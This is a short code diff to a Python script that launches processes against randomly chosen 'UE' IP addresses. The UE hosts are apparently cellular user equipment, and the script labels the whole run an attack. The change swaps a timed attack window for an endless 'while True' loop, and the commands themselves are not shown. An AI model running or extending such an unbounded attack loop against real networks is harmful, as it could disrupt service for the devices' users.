@@ -13,12 +13,11 @@ def run_command(command):
         subprocess.run(command)  
 
 
-while attack_start_time <= attack_end_time: #CHANGE TO END TIME OF ATTACK
+while True: #CHANGE TO END TIME OF ATTACK
     ue_ip_list = read_ips()
     processes = []
-    t_plus = attack_start_time + 4 #however long the attack is
     
-    print("ATTACK interval in seconds = [", str(attack_start_time), ", ", str(t_plus), "]")
+    print("ATTACK RUNNING...")
     random.shuffle(ue_ip_list)
     for ue in ue_ip_list:
         ue_ip = random.choice(ue_ip_list)
@@ -29,8 +28,4 @@ while attack_start_time <= attack_end_time: #CHANGE TO END TIME OF ATTACK
 
     for p in processes:
         p.start()
-
-    #time.sleep(4) #however long the script is
-
-attack_start_time += 4 #however long
 
